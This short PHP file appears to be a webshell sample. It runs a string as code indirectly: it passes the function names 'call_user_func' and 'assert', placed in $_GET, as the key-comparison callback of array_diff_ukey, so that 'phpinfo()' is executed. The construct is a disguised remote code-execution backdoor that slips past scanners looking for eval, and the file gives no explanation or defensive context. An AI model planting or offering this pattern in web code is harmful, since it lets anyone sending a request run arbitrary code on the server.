<?php
$_GET['arg1'] = "phpinfo()";
$_GET['arg2'] = "assert";
$_GET['func'] = "call_user_func";

$some = array($_GET['arg1'] =>1, $_GET['arg2']=>2);
$func = $_GET['func'];
array_diff_ukey($some, array(), $func);
?>
